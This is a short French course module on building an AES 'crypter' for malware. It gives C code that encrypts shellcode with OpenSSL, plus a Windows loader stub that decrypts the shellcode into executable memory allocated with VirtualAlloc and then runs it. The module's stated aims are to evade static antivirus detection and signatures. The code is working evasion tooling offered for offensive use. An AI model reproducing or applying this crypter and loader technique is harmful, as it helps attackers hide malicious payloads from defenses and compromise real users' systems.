# Module : Crypters AES

## Objectifs

- Utiliser AES pour chiffrer le shellcode
- Implémenter un décrypteur en mémoire
- Éviter la détection statique

---

## 1. Pourquoi AES ?

```
XOR : Facilement détectable (patterns répétitifs)
AES : Chiffrement fort, output aléatoire
```

---

## 2. Chiffrement avec OpenSSL

```c
#include <openssl/evp.h>

int aes_encrypt(unsigned char *plaintext, int len,
                unsigned char *key, unsigned char *iv,
                unsigned char *ciphertext) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int out_len, final_len;
    
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, ciphertext, &out_len, plaintext, len);
    EVP_EncryptFinal_ex(ctx, ciphertext + out_len, &final_len);
    
    EVP_CIPHER_CTX_free(ctx);
    return out_len + final_len;
}
```

---

## 3. Stub de décryptage

```c
// Dans le loader
void *exec_mem = VirtualAlloc(NULL, size, 
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

aes_decrypt(encrypted_shellcode, len, key, iv, exec_mem);

((void(*)())exec_mem)();  // Exécuter
```

---

## 4. Avantages

- Chiffrement fort (AES-256)
- Clé différente = output différent
- Évite la signature statique
